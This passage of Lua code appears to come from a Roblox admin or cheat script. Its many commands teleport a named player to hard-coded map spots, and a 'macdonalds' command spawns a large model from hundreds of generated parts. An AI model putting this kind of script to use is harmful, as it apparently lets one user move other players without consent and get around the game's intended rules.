            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cityroof") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-323.6265869140625, 118.83882141113281, 1999.3377685546875));
            Notify("Success", "Teleported " .. Player.Name .. " to city roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shoproof") or CMD('sr2') then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-341.98907470703125, 88.36956024169922, 1796.1947021484375));
            Notify("Success", "Teleported " .. Player.Name .. " to shop roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("storeroof") or CMD("sr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-412.3269348144531, 71.59940338134766, 1755.07421875));
            Notify("Success", "Teleported " .. Player.Name .. " to store roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("hidingspot") or CMD("hs") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-347.8111572265625, 64.57244110107422, 1803.2864990234375));
            Notify("Success", "Teleported " .. Player.Name .. " to hiding spot.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shops2") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327));
            Notify("Success", "Teleported " .. Player.Name .. " to shops 2.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("secret") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-430.9945373535156, 71.59940338134766, 1731.3880615234375));
            Notify("Success", "Teleported " .. Player.Name .. " to secret.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("store") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-417.1138610839844, 54.20008087158203, 1745.92822265625));
            Notify("Success", "Teleported " .. Player.Name .. " to store.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("gas") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-520.7560424804688, 54.393775939941406, 1654.55908203125));
            Notify("Success", "Teleported " .. Player.Name .. " to gas station.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("bridge") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-87.46949005126953, 33.49931335449219, 1324.4083251953125));
            Notify("Success", "Teleported " .. Player.Name .. " to bridge.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shops") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(439.6669006347656, 11.425360679626465, 1215.47705078125));
            Notify("Success", "Teleported " .. Player.Name .. " to shops.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("powerline") or CMD("pwrline") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(911.0464477539062, 139.43991088867188, 2072.38623046875));
            Notify("Success", "Teleported " .. Player.Name .. " to powerline.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("office") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(706.15771484375, 103.10001373291016, 2344.278076171875));
            Notify("Success", "Teleported " .. Player.Name .. " to office.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("gate") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(504.4410400390625, 102.0399169921875, 2250.787109375));
            Notify("Success", "Teleported " .. Player.Name .. " to gate.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("gatetwr") or CMD("gt") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(500.2741394042969, 125.0399169921875, 2306.7822265625));
            Notify("Success", "Teleported " .. Player.Name .. " to gate tower.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cellroof") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(956.5949096679688, 134.0049285888672, 2451.7646484375));
            Notify("Success", "Teleported " .. Player.Name .. " to cells roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("roof") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(932.247314453125, 136.9999542236328, 2235.9921875));
            Notify("Success", "Teleported " .. Player.Name .. " to roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("safe") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(933.4338989257812, 121.9676513671875, 2232.634521484375));
            Notify("Success", "Teleported " .. Player.Name .. " to safe.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("vent") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(934.0016479492188, 124.38994598388672, 2223.648681640625));
            Notify("Success", "Teleported " .. Player.Name .. " to vent.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("slide") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(515.8078002929688, 367.4695739746094, 3451.99755859375));
            Notify("Success", "Teleported " .. Player.Name .. " to slide area.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("1v1") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-236.87460327148438, 10.839909553527832, 1448.4461669921875));
            Notify("Success", "Teleported " .. Player.Name .. " to 1v1 spot.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("mcd") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-39.30183410644531, 11856.84765625, -5.665815830230713));
            Notify("Success", "Teleported " .. Player.Name .. " to back to mcdonalds.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("macdonalds") or CMD("mc") or CMD("mac") then
        --meshes are broken xdd
        function sandbox(var, func)
            local env = getfenv(func)
            local newenv =
                setmetatable(
                {},
                {
                    __index = function(self, k)
                        if k == "script" then
                            return var
                        else
                            return env[k]
                        end
                    end
                }
            )
            setfenv(func, newenv)
            return func
        end
        cors = {}
        mas = Instance.new("Model", game:GetService("Lighting"))
        Model0 = Instance.new("Model")
        Part1 = Instance.new("Part")
        Part2 = Instance.new("Part")
        Part3 = Instance.new("Part")
        Part4 = Instance.new("Part")
        Part5 = Instance.new("Part")
        Part6 = Instance.new("Part")
        PointLight7 = Instance.new("PointLight")
        Part8 = Instance.new("Part")
        Part9 = Instance.new("Part")
        Part10 = Instance.new("Part")
        Part11 = Instance.new("Part")
        Part12 = Instance.new("Part")
        Part13 = Instance.new("Part")
        Part14 = Instance.new("Part")
        Part15 = Instance.new("Part")
        Part16 = Instance.new("Part")
        Part17 = Instance.new("Part")
        Part18 = Instance.new("Part")
        Part19 = Instance.new("Part")
        Part20 = Instance.new("Part")
        Part21 = Instance.new("Part")
        Part22 = Instance.new("Part")
        Part23 = Instance.new("Part")
        Decal24 = Instance.new("Decal")
        Decal25 = Instance.new("Decal")
        Decal26 = Instance.new("Decal")
        Decal27 = Instance.new("Decal")
        Decal28 = Instance.new("Decal")
        Decal29 = Instance.new("Decal")
        Part30 = Instance.new("Part")
        Decal31 = Instance.new("Decal")
        Decal32 = Instance.new("Decal")
        Decal33 = Instance.new("Decal")
        Decal34 = Instance.new("Decal")
        Decal35 = Instance.new("Decal")
        Decal36 = Instance.new("Decal")
        Part37 = Instance.new("Part")
        PointLight38 = Instance.new("PointLight")
        Part39 = Instance.new("Part")
        Part40 = Instance.new("Part")
        Part41 = Instance.new("Part")
        Part42 = Instance.new("Part")
        Part43 = Instance.new("Part")
        Part44 = Instance.new("Part")
        Part45 = Instance.new("Part")
        Part46 = Instance.new("Part")
        Part47 = Instance.new("Part")
        Part48 = Instance.new("Part")
        Part49 = Instance.new("Part")
        Part50 = Instance.new("Part")
        Part51 = Instance.new("Part")
        Part52 = Instance.new("Part")
        Decal53 = Instance.new("Decal")
        Decal54 = Instance.new("Decal")
        Decal55 = Instance.new("Decal")
        Decal56 = Instance.new("Decal")
        Decal57 = Instance.new("Decal")
        Decal58 = Instance.new("Decal")
        Part59 = Instance.new("Part")
        Decal60 = Instance.new("Decal")
        Decal61 = Instance.new("Decal")
        Decal62 = Instance.new("Decal")
        Decal63 = Instance.new("Decal")
        Decal64 = Instance.new("Decal")
        Decal65 = Instance.new("Decal")
        Part66 = Instance.new("Part")
        Part67 = Instance.new("Part")
        Decal68 = Instance.new("Decal")
        Decal69 = Instance.new("Decal")
        Decal70 = Instance.new("Decal")
        Decal71 = Instance.new("Decal")
        Decal72 = Instance.new("Decal")
        Decal73 = Instance.new("Decal")
        Part74 = Instance.new("Part")
        Decal75 = Instance.new("Decal")
        Decal76 = Instance.new("Decal")
        Decal77 = Instance.new("Decal")
        Decal78 = Instance.new("Decal")
        Decal79 = Instance.new("Decal")
        Decal80 = Instance.new("Decal")
        Part81 = Instance.new("Part")
        Decal82 = Instance.new("Decal")
        Decal83 = Instance.new("Decal")
        Decal84 = Instance.new("Decal")
        Decal85 = Instance.new("Decal")
        Decal86 = Instance.new("Decal")
        Decal87 = Instance.new("Decal")
        Part88 = Instance.new("Part")
        Decal89 = Instance.new("Decal")
        Decal90 = Instance.new("Decal")
        Decal91 = Instance.new("Decal")
        Decal92 = Instance.new("Decal")
        Decal93 = Instance.new("Decal")
        Decal94 = Instance.new("Decal")
        Model95 = Instance.new("Model")
        Model96 = Instance.new("Model")
        Part97 = Instance.new("Part")
        Seat98 = Instance.new("Seat")
        Part99 = Instance.new("Part")
        Part100 = Instance.new("Part")
        Part101 = Instance.new("Part")
        Part102 = Instance.new("Part")
        Part103 = Instance.new("Part")
        Part104 = Instance.new("Part")
        Part105 = Instance.new("Part")
        Part106 = Instance.new("Part")
        Part107 = Instance.new("Part")
        Part108 = Instance.new("Part")
        Part109 = Instance.new("Part")
        Part110 = Instance.new("Part")
        Model111 = Instance.new("Model")
        Part112 = Instance.new("Part")
        Part113 = Instance.new("Part")
        Part114 = Instance.new("Part")
        Part115 = Instance.new("Part")
        Part116 = Instance.new("Part")
        Model117 = Instance.new("Model")
        Part118 = Instance.new("Part")
        Seat119 = Instance.new("Seat")
        Part120 = Instance.new("Part")
        Part121 = Instance.new("Part")
        Part122 = Instance.new("Part")
        Part123 = Instance.new("Part")
        Part124 = Instance.new("Part")
        Part125 = Instance.new("Part")
        Part126 = Instance.new("Part")
        Part127 = Instance.new("Part")
        Part128 = Instance.new("Part")
        Part129 = Instance.new("Part")
        Part130 = Instance.new("Part")
        Part131 = Instance.new("Part")
        Model132 = Instance.new("Model")
        Model133 = Instance.new("Model")
        Part134 = Instance.new("Part")
        SurfaceLight135 = Instance.new("SurfaceLight")
        Decal136 = Instance.new("Decal")
        UnionOperation137 = Instance.new("UnionOperation")
        Decal138 = Instance.new("Decal")
        Decal139 = Instance.new("Decal")
        Decal140 = Instance.new("Decal")
        Decal141 = Instance.new("Decal")
        Decal142 = Instance.new("Decal")
        Model143 = Instance.new("Model")
        Part144 = Instance.new("Part")
        Decal145 = Instance.new("Decal")
        SurfaceLight146 = Instance.new("SurfaceLight")
        UnionOperation147 = Instance.new("UnionOperation")
        Decal148 = Instance.new("Decal")
        Decal149 = Instance.new("Decal")
        Decal150 = Instance.new("Decal")
        Decal151 = Instance.new("Decal")
        Decal152 = Instance.new("Decal")
        Part153 = Instance.new("Part")
        Part154 = Instance.new("Part")
        MeshPart155 = Instance.new("MeshPart")
        SurfaceLight156 = Instance.new("SurfaceLight")
        SurfaceLight157 = Instance.new("SurfaceLight")
        Decal158 = Instance.new("Decal")
        Decal159 = Instance.new("Decal")
        Decal160 = Instance.new("Decal")
        Decal161 = Instance.new("Decal")
        Part162 = Instance.new("Part")
        ManualWeld163 = Instance.new("ManualWeld")
        UnionOperation164 = Instance.new("UnionOperation")
        UnionOperation165 = Instance.new("UnionOperation")
        MeshPart166 = Instance.new("MeshPart")
        MeshPart167 = Instance.new("MeshPart")
        Model168 = Instance.new("Model")
        Part169 = Instance.new("Part")
        Part170 = Instance.new("Part")
        Part171 = Instance.new("Part")
        Part172 = Instance.new("Part")
        Part173 = Instance.new("Part")
        Part174 = Instance.new("Part")
        Part175 = Instance.new("Part")
        SurfaceGui176 = Instance.new("SurfaceGui")
        ImageLabel177 = Instance.new("ImageLabel")
        Part178 = Instance.new("Part")
        SurfaceGui179 = Instance.new("SurfaceGui")
        ImageLabel180 = Instance.new("ImageLabel")
        Part181 = Instance.new("Part")
        SurfaceGui182 = Instance.new("SurfaceGui")
        ImageLabel183 = Instance.new("ImageLabel")
        Part184 = Instance.new("Part")
        Part185 = Instance.new("Part")
        Part186 = Instance.new("Part")
        Part187 = Instance.new("Part")
        Part188 = Instance.new("Part")
        Part189 = Instance.new("Part")
        Part190 = Instance.new("Part")
        Part191 = Instance.new("Part")
        Texture192 = Instance.new("Texture")
        Part193 = Instance.new("Part")
        Part194 = Instance.new("Part")
        Part195 = Instance.new("Part")
        Part196 = Instance.new("Part")
        Part197 = Instance.new("Part")
        Part198 = Instance.new("Part")
        Part199 = Instance.new("Part")
        Part200 = Instance.new("Part")
        PointLight201 = Instance.new("PointLight")
        Part202 = Instance.new("Part")
        PointLight203 = Instance.new("PointLight")
        Part204 = Instance.new("Part")
        Part205 = Instance.new("Part")
        Part206 = Instance.new("Part")
        Part207 = Instance.new("Part")
        Part208 = Instance.new("Part")
        Part209 = Instance.new("Part")
        Part210 = Instance.new("Part")
        Part211 = Instance.new("Part")
        Part212 = Instance.new("Part")
        Part213 = Instance.new("Part")
        Part214 = Instance.new("Part")
        Part215 = Instance.new("Part")
        Part216 = Instance.new("Part")
        Part217 = Instance.new("Part")
        Part218 = Instance.new("Part")
        Part219 = Instance.new("Part")
        Decal220 = Instance.new("Decal")
        Decal221 = Instance.new("Decal")
        Decal222 = Instance.new("Decal")
        Decal223 = Instance.new("Decal")
        Decal224 = Instance.new("Decal")
        Decal225 = Instance.new("Decal")
        Part226 = Instance.new("Part")
        Decal227 = Instance.new("Decal")
        Decal228 = Instance.new("Decal")
        Decal229 = Instance.new("Decal")
        Decal230 = Instance.new("Decal")
        Decal231 = Instance.new("Decal")
        Decal232 = Instance.new("Decal")
        Part233 = Instance.new("Part")
        Decal234 = Instance.new("Decal")
        Decal235 = Instance.new("Decal")
        Decal236 = Instance.new("Decal")
        Decal237 = Instance.new("Decal")
        Decal238 = Instance.new("Decal")
        Decal239 = Instance.new("Decal")
        Part240 = Instance.new("Part")
        Decal241 = Instance.new("Decal")
        Decal242 = Instance.new("Decal")
        Decal243 = Instance.new("Decal")
        Decal244 = Instance.new("Decal")
        Decal245 = Instance.new("Decal")
        Decal246 = Instance.new("Decal")
        Part247 = Instance.new("Part")
        Decal248 = Instance.new("Decal")
        Decal249 = Instance.new("Decal")
        Decal250 = Instance.new("Decal")
        Decal251 = Instance.new("Decal")
        Decal252 = Instance.new("Decal")
        Decal253 = Instance.new("Decal")
        Part254 = Instance.new("Part")
        Decal255 = Instance.new("Decal")
        Decal256 = Instance.new("Decal")
        Decal257 = Instance.new("Decal")
        Decal258 = Instance.new("Decal")
        Decal259 = Instance.new("Decal")
        Decal260 = Instance.new("Decal")
        Model261 = Instance.new("Model")
        Part262 = Instance.new("Part")
        UnionOperation263 = Instance.new("UnionOperation")
        Part264 = Instance.new("Part")
        Decal265 = Instance.new("Decal")
        Part266 = Instance.new("Part")
        Part267 = Instance.new("Part")
        Part268 = Instance.new("Part")
        Decal269 = Instance.new("Decal")
        Part270 = Instance.new("Part")
        UnionOperation271 = Instance.new("UnionOperation")
        Part272 = Instance.new("Part")
        Part273 = Instance.new("Part")
        Decal274 = Instance.new("Decal")
        WedgePart275 = Instance.new("WedgePart")
        Part276 = Instance.new("Part")
        Decal277 = Instance.new("Decal")
        Part278 = Instance.new("Part")
        Part279 = Instance.new("Part")
        Part280 = Instance.new("Part")
        Part281 = Instance.new("Part")
        Part282 = Instance.new("Part")
        Part283 = Instance.new("Part")
        Part284 = Instance.new("Part")
        Part285 = Instance.new("Part")
        Part286 = Instance.new("Part")
        Part287 = Instance.new("Part")
        Part288 = Instance.new("Part")
        UnionOperation289 = Instance.new("UnionOperation")
        Part290 = Instance.new("Part")
        Part291 = Instance.new("Part")
        Part292 = Instance.new("Part")
        Part293 = Instance.new("Part")
        UnionOperation294 = Instance.new("UnionOperation")
        Part295 = Instance.new("Part")
        Part296 = Instance.new("Part")
        Decal297 = Instance.new("Decal")
        Part298 = Instance.new("Part")
        Part299 = Instance.new("Part")
        Part300 = Instance.new("Part")
        Part301 = Instance.new("Part")
        Part302 = Instance.new("Part")
        Part303 = Instance.new("Part")
        Part304 = Instance.new("Part")
        Part305 = Instance.new("Part")
        Part306 = Instance.new("Part")
        Part307 = Instance.new("Part")
        Part308 = Instance.new("Part")
        Decal309 = Instance.new("Decal")
        Part310 = Instance.new("Part")
        UnionOperation311 = Instance.new("UnionOperation")
        Part312 = Instance.new("Part")
        Decal313 = Instance.new("Decal")
        Part314 = Instance.new("Part")
        Decal315 = Instance.new("Decal")
        Part316 = Instance.new("Part")
        UnionOperation317 = Instance.new("UnionOperation")
        Part318 = Instance.new("Part")
        UnionOperation319 = Instance.new("UnionOperation")
        Part320 = Instance.new("Part")
        Part321 = Instance.new("Part")
        Part322 = Instance.new("Part")
        Part323 = Instance.new("Part")
        Part324 = Instance.new("Part")
        Model325 = Instance.new("Model")
        Model326 = Instance.new("Model")
        Part327 = Instance.new("Part")
        Seat328 = Instance.new("Seat")
        Part329 = Instance.new("Part")
        Part330 = Instance.new("Part")
        Part331 = Instance.new("Part")
        Part332 = Instance.new("Part")
        Part333 = Instance.new("Part")
        Part334 = Instance.new("Part")
        Part335 = Instance.new("Part")
        Part336 = Instance.new("Part")
        Part337 = Instance.new("Part")
        Part338 = Instance.new("Part")
        Part339 = Instance.new("Part")
        Part340 = Instance.new("Part")
        Model341 = Instance.new("Model")
        Part342 = Instance.new("Part")
        Part343 = Instance.new("Part")
        Part344 = Instance.new("Part")
        Part345 = Instance.new("Part")
        Part346 = Instance.new("Part")
        Model347 = Instance.new("Model")
        Part348 = Instance.new("Part")
        Seat349 = Instance.new("Seat")
        Part350 = Instance.new("Part")
        Part351 = Instance.new("Part")
        Part352 = Instance.new("Part")
        Part353 = Instance.new("Part")
        Part354 = Instance.new("Part")
        Part355 = Instance.new("Part")
        Part356 = Instance.new("Part")
        Part357 = Instance.new("Part")
        Part358 = Instance.new("Part")
        Part359 = Instance.new("Part")
        Part360 = Instance.new("Part")
        Part361 = Instance.new("Part")
        Model362 = Instance.new("Model")
        Model363 = Instance.new("Model")
        Part364 = Instance.new("Part")
        Seat365 = Instance.new("Seat")
        Part366 = Instance.new("Part")
        Part367 = Instance.new("Part")
        Part368 = Instance.new("Part")
        Part369 = Instance.new("Part")
        Part370 = Instance.new("Part")
        Part371 = Instance.new("Part")
        Part372 = Instance.new("Part")
        Part373 = Instance.new("Part")
        Part374 = Instance.new("Part")
        Part375 = Instance.new("Part")
        Part376 = Instance.new("Part")
        Part377 = Instance.new("Part")
        Model378 = Instance.new("Model")
        Part379 = Instance.new("Part")
        Part380 = Instance.new("Part")
        Part381 = Instance.new("Part")
        Part382 = Instance.new("Part")
        Part383 = Instance.new("Part")
        Model384 = Instance.new("Model")
        Part385 = Instance.new("Part")
        Seat386 = Instance.new("Seat")
        Part387 = Instance.new("Part")
        Part388 = Instance.new("Part")
        Part389 = Instance.new("Part")
        Part390 = Instance.new("Part")
        Part391 = Instance.new("Part")
        Part392 = Instance.new("Part")
        Part393 = Instance.new("Part")
        Part394 = Instance.new("Part")
        Part395 = Instance.new("Part")
        Part396 = Instance.new("Part")
        Part397 = Instance.new("Part")
        Part398 = Instance.new("Part")
        Model399 = Instance.new("Model")
        Model400 = Instance.new("Model")
        Part401 = Instance.new("Part")
        Seat402 = Instance.new("Seat")
        Part403 = Instance.new("Part")
        Part404 = Instance.new("Part")
        Part405 = Instance.new("Part")
        Part406 = Instance.new("Part")
        Part407 = Instance.new("Part")
        Part408 = Instance.new("Part")
        Part409 = Instance.new("Part")
        Part410 = Instance.new("Part")
        Part411 = Instance.new("Part")
        Part412 = Instance.new("Part")
        Part413 = Instance.new("Part")
        Part414 = Instance.new("Part")
        Model415 = Instance.new("Model")
        Part416 = Instance.new("Part")
        Part417 = Instance.new("Part")
        Part418 = Instance.new("Part")
        Part419 = Instance.new("Part")
        Part420 = Instance.new("Part")
        Model421 = Instance.new("Model")
        Part422 = Instance.new("Part")
        Seat423 = Instance.new("Seat")
        Part424 = Instance.new("Part")
        Part425 = Instance.new("Part")
        Part426 = Instance.new("Part")
        Part427 = Instance.new("Part")
        Part428 = Instance.new("Part")
        Part429 = Instance.new("Part")
        Part430 = Instance.new("Part")
        Part431 = Instance.new("Part")
        Part432 = Instance.new("Part")
        Part433 = Instance.new("Part")
        Part434 = Instance.new("Part")
        Part435 = Instance.new("Part")
        Model436 = Instance.new("Model")
        Part437 = Instance.new("Part")
        Seat438 = Instance.new("Seat")
        Part439 = Instance.new("Part")
        Part440 = Instance.new("Part")
        Part441 = Instance.new("Part")
        Part442 = Instance.new("Part")
        Part443 = Instance.new("Part")
        Part444 = Instance.new("Part")
        Part445 = Instance.new("Part")
        Part446 = Instance.new("Part")
        Part447 = Instance.new("Part")
        Part448 = Instance.new("Part")
        Part449 = Instance.new("Part")
        Part450 = Instance.new("Part")
        Model451 = Instance.new("Model")
        Model452 = Instance.new("Model")
        Part453 = Instance.new("Part")
        Seat454 = Instance.new("Seat")
        Part455 = Instance.new("Part")
        Part456 = Instance.new("Part")
        Part457 = Instance.new("Part")
        Part458 = Instance.new("Part")
        Part459 = Instance.new("Part")
        Part460 = Instance.new("Part")
        Part461 = Instance.new("Part")
        Part462 = Instance.new("Part")
        Part463 = Instance.new("Part")
        Part464 = Instance.new("Part")
        Part465 = Instance.new("Part")
        Part466 = Instance.new("Part")
        Part467 = Instance.new("Part")
        Part468 = Instance.new("Part")
        Part469 = Instance.new("Part")
        Part470 = Instance.new("Part")
        Part471 = Instance.new("Part")
        Part472 = Instance.new("Part")
        Part473 = Instance.new("Part")
        Part474 = Instance.new("Part")
        Part475 = Instance.new("Part")
        Decal476 = Instance.new("Decal")
        Part477 = Instance.new("Part")
        Part478 = Instance.new("Part")
        Part479 = Instance.new("Part")
        Part480 = Instance.new("Part")
        PointLight481 = Instance.new("PointLight")
        Part482 = Instance.new("Part")
        PointLight483 = Instance.new("PointLight")
        MeshPart484 = Instance.new("MeshPart")
        Part485 = Instance.new("Part")
        Part486 = Instance.new("Part")
        Part487 = Instance.new("Part")
        Part488 = Instance.new("Part")
        Part489 = Instance.new("Part")
        Part490 = Instance.new("Part")
        Part491 = Instance.new("Part")
        Part492 = Instance.new("Part")
        Part493 = Instance.new("Part")
        Part494 = Instance.new("Part")
        PointLight495 = Instance.new("PointLight")
        Part496 = Instance.new("Part")
        Part497 = Instance.new("Part")
        PointLight498 = Instance.new("PointLight")
        Part499 = Instance.new("Part")
        PointLight500 = Instance.new("PointLight")
        MeshPart501 = Instance.new("MeshPart")
        MeshPart502 = Instance.new("MeshPart")
        Part503 = Instance.new("Part")
        Part504 = Instance.new("Part")
        Texture505 = Instance.new("Texture")
        Part506 = Instance.new("Part")
        Texture507 = Instance.new("Texture")
        Part508 = Instance.new("Part")
        Part509 = Instance.new("Part")
        Part510 = Instance.new("Part")
        Part511 = Instance.new("Part")
        Part512 = Instance.new("Part")
        Part513 = Instance.new("Part")
        Part514 = Instance.new("Part")
        Part515 = Instance.new("Part")
        Part516 = Instance.new("Part")
        Part517 = Instance.new("Part")
        Part518 = Instance.new("Part")
        Part519 = Instance.new("Part")
        Part520 = Instance.new("Part")
        Part521 = Instance.new("Part")
        Part522 = Instance.new("Part")
        Part523 = Instance.new("Part")
        Part524 = Instance.new("Part")
        Part525 = Instance.new("Part")
        Part526 = Instance.new("Part")
        Part527 = Instance.new("Part")
        Part528 = Instance.new("Part")
        Part529 = Instance.new("Part")
        Part530 = Instance.new("Part")
        Part531 = Instance.new("Part")
        Part532 = Instance.new("Part")
        Part533 = Instance.new("Part")
        Part534 = Instance.new("Part")
        Part535 = Instance.new("Part")
        Part536 = Instance.new("Part")
        Part537 = Instance.new("Part")
        Part538 = Instance.new("Part")
        Part539 = Instance.new("Part")
        Part540 = Instance.new("Part")
        Part541 = Instance.new("Part")
        Part542 = Instance.new("Part")
        Part543 = Instance.new("Part")
        Part544 = Instance.new("Part")
        Part545 = Instance.new("Part")
        Part546 = Instance.new("Part")
        Part547 = Instance.new("Part")
        Part548 = Instance.new("Part")
        Part549 = Instance.new("Part")
        Part550 = Instance.new("Part")
        Part551 = Instance.new("Part")
        Part552 = Instance.new("Part")
        Part553 = Instance.new("Part")
        Part554 = Instance.new("Part")
        Part555 = Instance.new("Part")
        Part556 = Instance.new("Part")
        Part557 = Instance.new("Part")
        Part558 = Instance.new("Part")
        Part559 = Instance.new("Part")
        Part560 = Instance.new("Part")
        Part561 = Instance.new("Part")
        Part562 = Instance.new("Part")
        Part563 = Instance.new("Part")
        Part564 = Instance.new("Part")
        Part565 = Instance.new("Part")
        Model566 = Instance.new("Model")
        Model567 = Instance.new("Model")
        Part568 = Instance.new("Part")
        Seat569 = Instance.new("Seat")
        Part570 = Instance.new("Part")
        Part571 = Instance.new("Part")
        Part572 = Instance.new("Part")
        Part573 = Instance.new("Part")
        Part574 = Instance.new("Part")
        Part575 = Instance.new("Part")
        Part576 = Instance.new("Part")
        Part577 = Instance.new("Part")
        Part578 = Instance.new("Part")
        Part579 = Instance.new("Part")
        Part580 = Instance.new("Part")
        Part581 = Instance.new("Part")
        Model582 = Instance.new("Model")
        Part583 = Instance.new("Part")
        Part584 = Instance.new("Part")
        Part585 = Instance.new("Part")
        Part586 = Instance.new("Part")
        Part587 = Instance.new("Part")
        Model588 = Instance.new("Model")
        Part589 = Instance.new("Part")
        Seat590 = Instance.new("Seat")
        Part591 = Instance.new("Part")
        Part592 = Instance.new("Part")
        Part593 = Instance.new("Part")
        Part594 = Instance.new("Part")
        Part595 = Instance.new("Part")
        Part596 = Instance.new("Part")
        Part597 = Instance.new("Part")
        Part598 = Instance.new("Part")
        Part599 = Instance.new("Part")
        Part600 = Instance.new("Part")
        Part601 = Instance.new("Part")
        Part602 = Instance.new("Part")
        Part603 = Instance.new("Part")
        Part604 = Instance.new("Part")
        Part605 = Instance.new("Part")
        Part606 = Instance.new("Part")
        Part607 = Instance.new("Part")
        Part608 = Instance.new("Part")
        Part609 = Instance.new("Part")
        Part610 = Instance.new("Part")
        Part611 = Instance.new("Part")
        Part612 = Instance.new("Part")
        Part613 = Instance.new("Part")
        Part614 = Instance.new("Part")
        Part615 = Instance.new("Part")
        Part616 = Instance.new("Part")
        Part617 = Instance.new("Part")
        Part618 = Instance.new("Part")
        Part619 = Instance.new("Part")
        Part620 = Instance.new("Part")
        Part621 = Instance.new("Part")
        Part622 = Instance.new("Part")
        Part623 = Instance.new("Part")
        Part624 = Instance.new("Part")
        Texture625 = Instance.new("Texture")
        Part626 = Instance.new("Part")
        Part627 = Instance.new("Part")
        Part628 = Instance.new("Part")
        Part629 = Instance.new("Part")
        Texture630 = Instance.new("Texture")
        Part631 = Instance.new("Part")
        Part632 = Instance.new("Part")
        Part633 = Instance.new("Part")
        Part634 = Instance.new("Part")
        Part635 = Instance.new("Part")
        Part636 = Instance.new("Part")
        Part637 = Instance.new("Part")
        Part638 = Instance.new("Part")
        Part639 = Instance.new("Part")
        Part640 = Instance.new("Part")
        Part641 = Instance.new("Part")
        Part642 = Instance.new("Part")
        Part643 = Instance.new("Part")
        Part644 = Instance.new("Part")
        Part645 = Instance.new("Part")
        Part646 = Instance.new("Part")
        Part647 = Instance.new("Part")
        Part648 = Instance.new("Part")
        PointLight649 = Instance.new("PointLight")
        Part650 = Instance.new("Part")
        Part651 = Instance.new("Part")
        Part652 = Instance.new("Part")
        Part653 = Instance.new("Part")
        Texture654 = Instance.new("Texture")
        Part655 = Instance.new("Part")
        Part656 = Instance.new("Part")
        Part657 = Instance.new("Part")
        Part658 = Instance.new("Part")
        Part659 = Instance.new("Part")
        Part660 = Instance.new("Part")
        Part661 = Instance.new("Part")
        Part662 = Instance.new("Part")
        Part663 = Instance.new("Part")
        Part664 = Instance.new("Part")
        Part665 = Instance.new("Part")
        Part666 = Instance.new("Part")
        Part667 = Instance.new("Part")
        Part668 = Instance.new("Part")
        Part669 = Instance.new("Part")
        Part670 = Instance.new("Part")
        Part671 = Instance.new("Part")
